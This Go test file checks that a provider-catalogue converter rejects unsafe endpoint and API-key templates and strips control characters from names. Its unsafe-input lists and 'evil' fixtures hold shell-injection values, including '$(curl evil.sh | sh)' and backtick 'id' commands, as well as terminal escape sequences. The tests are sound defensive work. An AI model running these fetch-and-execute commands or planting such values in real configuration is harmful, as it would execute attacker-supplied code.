package opencode

import (
	"slices"
	"testing"

	"charm.land/catwalk/pkg/catwalk"
	"github.com/stretchr/testify/require"
)

func TestSafeTemplate(t *testing.T) {
	t.Parallel()

	safe := []string{
		"",
		"https://api.example.com/v1",
		"http://127.0.0.1:1234/v1",
		"$OPENAI_API_KEY",
		"${OPENAI_API_KEY}",
		"${A:-${B:-${C}}}",
		"${A:-}",
		"${A:-literal-default}",
		"https://${DATABRICKS_HOST}/ai-gateway/mlflow/v1",
		"https://api.cloudflare.com/client/v4/accounts/${CLOUDFLARE_ACCOUNT_ID}/ai/v1",
		"${NEON_AI_GATEWAY_BASE_URL}/v1",
		"$lower_case_ok",
		"$_UNDERSCORE",
		"https://example.com/a?b=c&d=e#frag",
		"https://example.com/{braces}/~tilde/50%",
		"https://例え.jp/v1",
		"sk-1234567890abcdef",
		"${A}${B}$C",
	}
	for _, s := range safe {
		require.True(t, SafeTemplate(s), "%q should be safe", s)
	}

	unsafe := []string{
		"$(id)",
		"$(curl evil.sh | sh)",
		"https://x/$(id)",
		"$((1+1))",
		"`id`",
		"https://x/`id`",
		"${A:-$(id)}",
		"${A:-`id`}",
		"${A:-${B:-$(id)}}",
		"${A:=x}",
		"${A:?err}",
		"${A:+alt}",
		"${A-x}",
		"${A=x}",
		"${A/x/y}",
		"${A#x}",
		"${A%x}",
		"${A^^}",
		"${A,,}",
		"${A:0:1}",
		"${A@P}",
		"${#A}",
		"${!A}",
		"${!A*}",
		"${A[0]}",
		"${}",
		"${1}",
		"${_}",
		"$1",
		"$$",
		"$?",
		"$#",
		"$@",
		"$*",
		"$!",
		"$-",
		"$_",
		"$",
		"x$",
		"$'\\x41'",
		`$"x"`,
		"$[1+1]",
		"${A",
		"${A:-x",
		"${A:-${B}",
		"'quoted'",
		`"quoted"`,
		`back\slash`,
		"line\nbreak",
		"nul\x00byte",
		"tab\there",
		"del\x7f",
		"bad\xffutf8",
		"${A:-${B:-${C:-${D:-${E:-${F:-${G:-${H:-${I:-${J}}}}}}}}}}",
	}
	for _, s := range unsafe {
		require.False(t, SafeTemplate(s), "%q should be unsafe", s)
	}
}

func TestEnvTemplate(t *testing.T) {
	t.Parallel()

	require.Equal(t, "", envTemplate(nil))
	require.Equal(t, "$A", envTemplate([]string{"A"}))
	require.Equal(t, "${A:-${B}}", envTemplate([]string{"A", "B"}))
	require.Equal(t, "${A:-${B:-${C}}}", envTemplate([]string{"A", "B", "C"}))
	for _, names := range [][]string{{"A"}, {"A", "B"}, {"A", "B", "C", "D"}} {
		require.True(t, SafeTemplate(envTemplate(names)))
	}
}

func TestProviderAPIKey(t *testing.T) {
	t.Parallel()

	tests := []struct {
		typ      catwalk.Type
		endpoint string
		env      []string
		want     string
	}{
		{catwalk.TypeOpenAI, "https://api.openai.com/v1", []string{"OPENAI_API_KEY"}, "$OPENAI_API_KEY"},
		{catwalk.TypeGoogle, "", []string{"GOOGLE_API_KEY", "GEMINI_API_KEY"}, "${GOOGLE_API_KEY:-${GEMINI_API_KEY}}"},
		{catwalk.TypeAzure, "https://${AZURE_RESOURCE_NAME}.openai.azure.com", []string{"AZURE_RESOURCE_NAME", "AZURE_API_KEY"}, "$AZURE_API_KEY"},
		{catwalk.TypeOpenAICompat, "https://${DATABRICKS_HOST}/v1", []string{"DATABRICKS_HOST", "DATABRICKS_TOKEN"}, "$DATABRICKS_TOKEN"},
		{catwalk.TypeOpenAICompat, "https://x", []string{"PRIVATEMODE_API_KEY", "PRIVATEMODE_ENDPOINT"}, "$PRIVATEMODE_API_KEY"},
		{catwalk.TypeOpenAICompat, "https://x", []string{"SNOWFLAKE_CORTEX_PAT"}, "$SNOWFLAKE_CORTEX_PAT"},
		{catwalk.TypeOpenAICompat, "https://x", []string{"ACCOUNT_ID"}, ""},
		{catwalk.TypeOpenAICompat, "https://x", nil, ""},
		{catwalk.TypeBedrock, "", []string{"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_BEARER_TOKEN_BEDROCK"}, ""},
		{catwalk.TypeVertexAI, "", []string{"GOOGLE_VERTEX_PROJECT"}, ""},
	}
	for _, tt := range tests {
		require.Equal(t, tt.want, providerAPIKey(tt.typ, tt.endpoint, tt.env), "%v", tt.env)
	}
}

func TestResolveWire(t *testing.T) {
	t.Parallel()

	tests := []struct {
		npm, api     string
		env          []string
		wantType     catwalk.Type
		wantEndpoint string
		ok           bool
	}{
		{"@ai-sdk/openai-compatible", "https://api.example.com/v1/", nil, catwalk.TypeOpenAICompat, "https://api.example.com/v1", true},
		{"@ai-sdk/openai-compatible", "", nil, "", "", false},
		{"@ai-sdk/anthropic", "", nil, catwalk.TypeAnthropic, "https://api.anthropic.com", true},
		{"@ai-sdk/anthropic", "https://api.minimax.io/anthropic/v1", nil, catwalk.TypeAnthropic, "https://api.minimax.io/anthropic", true},
		{"@ai-sdk/openai", "", nil, catwalk.TypeOpenAI, "https://api.openai.com/v1", true},
		{"@ai-sdk/openai", "https://api.perplexity.ai/v1", nil, catwalk.TypeOpenAI, "https://api.perplexity.ai/v1", true},
		{"@openrouter/ai-sdk-provider", "https://openrouter.ai/api/v1", nil, catwalk.TypeOpenRouter, "https://openrouter.ai/api/v1", true},
		{"@openrouter/ai-sdk-provider", "", nil, catwalk.TypeOpenRouter, "https://openrouter.ai/api/v1", true},
		{"@openrouter/ai-sdk-provider", "https://api.stdcmpt.com/v1", nil, catwalk.TypeOpenAICompat, "https://api.stdcmpt.com/v1", true},
		{"@ai-sdk/azure", "", []string{"AZURE_RESOURCE_NAME", "AZURE_API_KEY"}, catwalk.TypeAzure, "https://${AZURE_RESOURCE_NAME}.openai.azure.com", true},
		{"@ai-sdk/azure", "", []string{"AZURE_API_KEY"}, "", "", false},
		{"@ai-sdk/google", "", nil, catwalk.TypeGoogle, "https://generativelanguage.googleapis.com", true},
		{"@ai-sdk/google", "https://api.ofox.ai/gemini/v1beta", nil, catwalk.TypeGoogle, "https://api.ofox.ai/gemini", true},
		{"@ai-sdk/google-vertex", "", nil, catwalk.TypeVertexAI, "", true},
		{"@ai-sdk/amazon-bedrock", "", nil, catwalk.TypeBedrock, "", true},
		{"@ai-sdk/gateway", "", nil, catwalk.TypeVercel, "https://ai-gateway.vercel.sh/v1", true},
		{"@ai-sdk/groq", "", nil, catwalk.TypeOpenAICompat, "https://api.groq.com/openai/v1", true},
		{"@ai-sdk/xai", "", nil, catwalk.TypeOpenAICompat, "https://api.x.ai/v1", true},
		{"@ai-sdk/mistral", "", nil, catwalk.TypeOpenAICompat, "https://api.mistral.ai/v1", true},
		{"@ai-sdk/deepinfra", "", nil, catwalk.TypeOpenAICompat, "https://api.deepinfra.com/v1/openai", true},
		{"@ai-sdk/togetherai", "", nil, catwalk.TypeOpenAICompat, "https://api.together.xyz/v1", true},
		{"@ai-sdk/cerebras", "", nil, catwalk.TypeOpenAICompat, "https://api.cerebras.ai/v1", true},
		{"@ai-sdk/cohere", "", nil, catwalk.TypeOpenAICompat, "https://api.cohere.ai/compatibility/v1", true},
		{"venice-ai-sdk-provider", "", nil, catwalk.TypeOpenAICompat, "https://api.venice.ai/api/v1", true},
		{"@ai-sdk/perplexity", "", nil, "", "", false},
		{"gitlab-ai-provider", "", nil, "", "", false},
		{"@ai-sdk/google-vertex/anthropic", "", nil, "", "", false},
		{"@ai-sdk/amazon-bedrock/mantle", "", nil, "", "", false},
		{"ai-gateway-provider", "", nil, "", "", false},
	}
	for _, tt := range tests {
		typ, endpoint, ok := resolveWire(tt.npm, tt.api, tt.env)
		require.Equal(t, tt.ok, ok, "%s %s", tt.npm, tt.api)
		require.Equal(t, tt.wantType, typ, "%s %s", tt.npm, tt.api)
		require.Equal(t, tt.wantEndpoint, endpoint, "%s %s", tt.npm, tt.api)
	}
}

// fixtureModel is a tool-calling text model; tweak returns a modified
// copy.
func fixtureModel(id, release string, in float64, tweak ...func(*ModelsDevModel)) ModelsDevModel {
	m := ModelsDevModel{
		ID:          id,
		Name:        "Model " + id,
		ToolCall:    true,
		ReleaseDate: release,
		Modalities:  ModelsDevModalities{Input: []string{"text"}, Output: []string{"text"}},
		Cost:        &ModelsDevCost{Input: in, Output: in * 4},
		Limit:       ModelsDevLimit{Context: 200000, Output: 32000},
	}
	for _, f := range tweak {
		f(&m)
	}
	return m
}

func models(ms ...ModelsDevModel) map[string]ModelsDevModel {
	out := map[string]ModelsDevModel{}
	for _, m := range ms {
		out[m.ID] = m
	}
	return out
}

func TestToCatwalk(t *testing.T) {
	t.Parallel()

	md := map[string]ModelsDevProvider{
		"anthropic": {
			ID: "anthropic", Name: "Anthropic", NPM: "@ai-sdk/anthropic", Env: []string{"ANTHROPIC_API_KEY"},
			Models: models(
				fixtureModel("claude-big", "2026-06-01", 3, func(m *ModelsDevModel) {
					m.Reasoning = true
					m.Attachment = true
					m.Modalities.Input = []string{"text", "image", "pdf"}
					m.Cost = &ModelsDevCost{Input: 3, Output: 15, CacheRead: 0.3, CacheWrite: 3.75}
					m.Limit = ModelsDevLimit{Context: 1000000, Output: 128000}
					m.ReasoningOptions = []ModelsDevReasoningOption{
						{Type: "toggle"},
						{Type: "effort", Values: []string{"low", "medium", "high", "max"}},
					}
				}),
				fixtureModel("claude-tiny", "2026-07-01", 0.1),
				fixtureModel("claude-old", "2024-01-01", 0.01),
				fixtureModel("claude-deprecated", "2026-01-01", 1, func(m *ModelsDevModel) { m.Status = "deprecated" }),
				fixtureModel("claude-alpha", "2026-01-01", 1, func(m *ModelsDevModel) { m.Status = "alpha" }),
				fixtureModel("claude-beta", "2026-09-01", 50, func(m *ModelsDevModel) { m.Status = "beta" }),
				fixtureModel("claude-embed", "2026-01-01", 1, func(m *ModelsDevModel) { m.Type = "embedding" }),
				fixtureModel("claude-notools", "2026-01-01", 1, func(m *ModelsDevModel) { m.ToolCall = false }),
				fixtureModel("claude-image-out", "2026-01-01", 1, func(m *ModelsDevModel) { m.Modalities.Output = []string{"image"} }),
			),
		},
		"zen": {
			ID: "zen", Name: "Zen", NPM: "@ai-sdk/openai-compatible", API: "https://zen.example.com/v1",
			Env: []string{"ZEN_API_KEY"},
			Models: models(
				fixtureModel("chat", "2026-01-01", 1),
				// Same protocol and endpoint: kept.
				fixtureModel("same", "2026-01-01", 1, func(m *ModelsDevModel) {
					m.Provider = &ModelsDevModelProvider{NPM: "@ai-sdk/openai-compatible", API: "https://zen.example.com/v1/"}
				}),
				// Different protocol: skipped.
				fixtureModel("messages", "2026-01-01", 1, func(m *ModelsDevModel) {
					m.Provider = &ModelsDevModelProvider{NPM: "@ai-sdk/anthropic"}
				}),
				// Same protocol, different endpoint: skipped.
				fixtureModel("elsewhere", "2026-01-01", 1, func(m *ModelsDevModel) {
					m.Provider = &ModelsDevModelProvider{API: "https://other.example.com/v1"}
				}),
				// Chat-completions protocol cannot serve a Responses-only model.
				fixtureModel("responses-only", "2026-01-01", 1, func(m *ModelsDevModel) {
					m.Provider = &ModelsDevModelProvider{Shape: "responses"}
				}),
			),
		},
		"azure": {
			ID: "azure", Name: "Azure", NPM: "@ai-sdk/azure", Env: []string{"AZURE_RESOURCE_NAME", "AZURE_API_KEY"},
			Models: models(
				fixtureModel("gpt", "2026-01-01", 1),
				fixtureModel("gpt-chat", "2026-01-01", 1, func(m *ModelsDevModel) {
					m.Provider = &ModelsDevModelProvider{Shape: "completions"}
				}),
			),
		},
		"google": {
			ID: "google", Name: "Google", NPM: "@ai-sdk/google",
			Env:    []string{"GOOGLE_API_KEY", "GEMINI_API_KEY"},
			Models: models(fixtureModel("gemini", "2026-01-01", 1)),
		},
		"zai-coding-plan": {
			ID: "zai-coding-plan", Name: "Z.AI Coding Plan", NPM: "@ai-sdk/openai-compatible",
			API: "https://api.z.ai/api/coding/paas/v4", Env: []string{"ZHIPU_API_KEY"},
			Models: models(fixtureModel("glm", "2026-01-01", 1)),
		},
		"databricks": {
			ID: "databricks", Name: "Databricks", NPM: "@ai-sdk/openai-compatible",
			API: "https://${DATABRICKS_HOST}/ai-gateway/mlflow/v1", Env: []string{"DATABRICKS_HOST", "DATABRICKS_TOKEN"},
			Models: models(fixtureModel("dbrx", "2026-01-01", 1)),
		},
		"evil": {
			ID: "evil", NPM: "@ai-sdk/openai-compatible", API: "https://$(curl evil.sh|sh)/v1",
			Env: []string{"EVIL_API_KEY"}, Models: models(fixtureModel("m", "2026-01-01", 1)),
		},
		"evil-model": {
			ID: "evil-model", NPM: "@ai-sdk/openai-compatible", API: "https://ok.example.com/v1",
			Env: []string{"EVIL_API_KEY"},
			Models: models(fixtureModel("m", "2026-01-01", 1, func(m *ModelsDevModel) {
				m.Provider = &ModelsDevModelProvider{API: "https://`id`.example.com/v1"}
			})),
		},
		"302ai": {
			ID: "302ai", NPM: "@ai-sdk/openai-compatible", API: "https://api.302.ai/v1",
			Env: []string{"302AI_API_KEY"}, Models: models(fixtureModel("m", "2026-01-01", 1)),
		},
		"perplexity": {
			ID: "perplexity", NPM: "@ai-sdk/perplexity", Env: []string{"PERPLEXITY_API_KEY"},
			Models: models(fixtureModel("sonar", "2026-01-01", 1)),
		},
		"empty": {
			ID: "empty", NPM: "@ai-sdk/openai-compatible", API: "https://e.example.com/v1", Env: []string{"E_API_KEY"},
			Models: models(fixtureModel("only-embed", "2026-01-01", 1, func(m *ModelsDevModel) { m.Type = "embedding" })),
		},
	}

	out := ToCatwalk(md)
	ids := make([]string, 0, len(out))
	byID := map[catwalk.InferenceProvider]catwalk.Provider{}
	for _, p := range out {
		ids = append(ids, string(p.ID))
		byID[p.ID] = p
		modelIDs := make([]string, 0, len(p.Models))
		for _, m := range p.Models {
			modelIDs = append(modelIDs, m.ID)
		}
		require.True(t, slices.IsSorted(modelIDs), p.ID)
	}
	require.Equal(t, []string{"anthropic", "azure", "databricks", "gemini", "zai", "zen"}, ids)

	a := byID["anthropic"]
	require.Equal(t, catwalk.TypeAnthropic, a.Type)
	require.Equal(t, "https://api.anthropic.com", a.APIEndpoint)
	require.Equal(t, "$ANTHROPIC_API_KEY", a.APIKey)
	require.Equal(t, "Anthropic", a.Name)
	gotIDs := make([]string, 0, len(a.Models))
	for _, m := range a.Models {
		gotIDs = append(gotIDs, m.ID)
	}
	require.Equal(t, []string{"claude-beta", "claude-big", "claude-old", "claude-tiny"}, gotIDs)
	// Small: cheapest among models from the last year (claude-old is too
	// old). Large: newest model priced above the small pick, ignoring beta.
	require.Equal(t, "claude-tiny", a.DefaultSmallModelID)
	require.Equal(t, "claude-big", a.DefaultLargeModelID)
	require.Equal(t, catwalk.Model{
		ID:                     "claude-big",
		Name:                   "Model claude-big",
		CostPer1MIn:            3,
		CostPer1MOut:           15,
		CostPer1MInCached:      3.75,
		CostPer1MOutCached:     0.3,
		ContextWindow:          1000000,
		DefaultMaxTokens:       128000,
		CanReason:              true,
		ReasoningLevels:        []string{"low", "medium", "high", "max"},
		DefaultReasoningEffort: "high",
		SupportsImages:         true,
	}, a.Models[1])

	zen := byID["zen"]
	require.Equal(t, catwalk.TypeOpenAICompat, zen.Type)
	require.Equal(t, "https://zen.example.com/v1", zen.APIEndpoint)
	require.Len(t, zen.Models, 2)
	require.Equal(t, "chat", zen.Models[0].ID)
	require.Equal(t, "same", zen.Models[1].ID)

	az := byID["azure"]
	require.Equal(t, catwalk.TypeAzure, az.Type)
	require.Equal(t, "https://${AZURE_RESOURCE_NAME}.openai.azure.com", az.APIEndpoint)
	require.Equal(t, "$AZURE_API_KEY", az.APIKey)
	require.Len(t, az.Models, 1)

	g := byID["gemini"]
	require.Equal(t, catwalk.TypeGoogle, g.Type)
	require.Equal(t, "Google", g.Name)
	require.Equal(t, "${GOOGLE_API_KEY:-${GEMINI_API_KEY}}", g.APIKey)

	require.Equal(t, "https://api.z.ai/api/coding/paas/v4", byID["zai"].APIEndpoint)
	require.Equal(t, "$DATABRICKS_TOKEN", byID["databricks"].APIKey)
	require.Equal(t, "https://${DATABRICKS_HOST}/ai-gateway/mlflow/v1", byID["databricks"].APIEndpoint)

	// Deterministic.
	require.Equal(t, out, ToCatwalk(md))
}

func TestToCatwalkDedupesIDs(t *testing.T) {
	t.Parallel()

	// "zai" is renamed so it cannot collide with zai-coding-plan.
	p := func(id string) ModelsDevProvider {
		return ModelsDevProvider{
			ID: id, NPM: "@ai-sdk/openai-compatible", API: "https://" + id + ".example.com/v1",
			Env: []string{"ZHIPU_API_KEY"}, Models: models(fixtureModel("glm", "2026-01-01", 1)),
		}
	}
	out := ToCatwalk(map[string]ModelsDevProvider{"zai": p("zai"), "zai-coding-plan": p("zai-coding-plan")})
	require.Len(t, out, 2)
	require.Equal(t, catwalk.InferenceProvider("zai"), out[0].ID)
	require.Equal(t, "https://zai-coding-plan.example.com/v1", out[0].APIEndpoint)
	require.Equal(t, catwalk.InferenceProvider("zai-paas"), out[1].ID)
}

func TestToCatwalkSanitizesText(t *testing.T) {
	t.Parallel()

	out := ToCatwalk(map[string]ModelsDevProvider{
		"p": {
			ID: "p", Name: "Evil\x1b]0;title\x07 Corp", NPM: "@ai-sdk/openai-compatible", API: "https://p.example.com/v1",
			Env: []string{"P_API_KEY"},
			Models: models(
				fixtureModel("ok", "2026-01-01", 1, func(m *ModelsDevModel) { m.Name = "\x1b[31mRed\x1b[0m" }),
				fixtureModel("bad\nid", "2026-01-01", 1),
			),
		},
		"bad id": {
			ID: "bad id", NPM: "@ai-sdk/openai-compatible", API: "https://b.example.com/v1",
			Env: []string{"B_API_KEY"}, Models: models(fixtureModel("m", "2026-01-01", 1)),
		},
	})
	require.Len(t, out, 1)
	require.Equal(t, "Evil]0;title Corp", out[0].Name)
	require.Len(t, out[0].Models, 1)
	require.Equal(t, "[31mRed[0m", out[0].Models[0].Name)
}

func TestDefaultMaxTokens(t *testing.T) {
	t.Parallel()

	tests := []struct{ context, output, want int64 }{
		{200000, 64000, 64000},
		{1000000, 128000, 128000},
		{131072, 131072, 13107},
		{500000, 600000, 50000},
		{128000, 0, 12800},
		{0, 4096, 4096},
		{0, 0, 0},
	}
	for _, tt := range tests {
		require.Equal(t, tt.want, defaultMaxTokens(tt.context, tt.output), "%d/%d", tt.context, tt.output)
	}
}

func TestDefaultEffort(t *testing.T) {
	t.Parallel()

	require.Equal(t, "medium", defaultEffort([]string{"low", "medium", "high"}, catwalk.TypeOpenAI))
	require.Equal(t, "high", defaultEffort([]string{"low", "medium", "high"}, catwalk.TypeAnthropic))
	require.Equal(t, "high", defaultEffort([]string{"low", "high", "max"}, catwalk.TypeOpenAICompat))
	require.Equal(t, "default", defaultEffort([]string{"none", "default"}, catwalk.TypeOpenAICompat))
	require.Equal(t, "minimal", defaultEffort([]string{"none", "minimal"}, catwalk.TypeOpenAICompat))
	require.Equal(t, "", defaultEffort([]string{"none"}, catwalk.TypeOpenAICompat))
	require.Equal(t, "", defaultEffort(nil, catwalk.TypeOpenAICompat))
}

func TestPickDefaults(t *testing.T) {
	t.Parallel()

	d := func(s string) pickable { return pickable{release: parseReleaseDate(s)} }
	with := func(p pickable, id string, in float64, out int64) pickable {
		p.id, p.costIn, p.costOut, p.hasCost, p.output = id, in, in*2, true, out
		return p
	}

	// Ties on release date break on output limit, then ID.
	large, small := pickDefaults([]pickable{
		with(d("2026-05-01"), "b", 2, 64000),
		with(d("2026-05-01"), "a", 2, 64000),
		with(d("2026-05-01"), "c", 2, 128000),
		with(d("2026-04-01"), "cheap", 0.5, 8000),
	})
	require.Equal(t, "c", large)
	require.Equal(t, "cheap", small)

	// Unknown prices rank after known ones for the small pick, and with
	// nothing priced above the small pick the newest model is large.
	unpriced := d("2026-06-01")
	unpriced.id = "unpriced"
	large, small = pickDefaults([]pickable{unpriced, with(d("2026-01-01"), "priced", 1, 1000)})
	require.Equal(t, "priced", small)
	require.Equal(t, "unpriced", large)

	// Beta-only providers still get defaults.
	beta := with(d("2026-01-01"), "beta", 1, 1)
	beta.beta = true
	large, small = pickDefaults([]pickable{beta})
	require.Equal(t, "beta", large)
	require.Equal(t, "beta", small)

	large, small = pickDefaults(nil)
	require.Empty(t, large)
	require.Empty(t, small)
}

func TestCatwalkID(t *testing.T) {
	t.Parallel()

	require.Equal(t, "gemini", CatwalkID("google"))
	require.Equal(t, "bedrock", CatwalkID("amazon-bedrock"))
	require.Equal(t, "vertexai", CatwalkID("google-vertex"))
	require.Equal(t, "copilot", CatwalkID("github-copilot"))
	require.Equal(t, "opencode-zen", CatwalkID("opencode"))
	require.Equal(t, "zai", CatwalkID("zai-coding-plan"))
	require.Equal(t, "zai-paas", CatwalkID("zai"))
	require.Equal(t, "anthropic", CatwalkID("anthropic"))
	require.Equal(t, "my-custom", CatwalkID("my-custom"))

	require.Equal(t, "google", ModelsDevID("gemini"))
	require.Equal(t, "zai-coding-plan", ModelsDevID("zai"))
	require.Equal(t, "zai", ModelsDevID("zai-paas"))
	require.Equal(t, "anthropic", ModelsDevID("anthropic"))

	known := map[string]bool{}
	for _, id := range catwalk.KnownProviders() {
		known[string(id)] = true
	}
	seen := map[string]string{}
	for md, cw := range modelsDevToCatwalk {
		require.Empty(t, seen[cw], "%s and %s both map to %s", seen[cw], md, cw)
		seen[cw] = md
		require.Equal(t, md, ModelsDevID(CatwalkID(md)))
		require.Equal(t, cw, CatwalkID(ModelsDevID(cw)))
		// Every target is a catwalk provider, except the collision rename.
		if cw != "zai-paas" {
			require.True(t, known[cw], "%s is not a catwalk provider", cw)
		}
		// A mapped models.dev ID must not shadow a different catwalk
		// provider that keeps its own ID.
		if _, isTarget := catwalkToModelsDev[md]; !isTarget {
			require.False(t, known[md] && md != cw, "%s is a catwalk ID but maps to %s", md, cw)
		}
	}
}
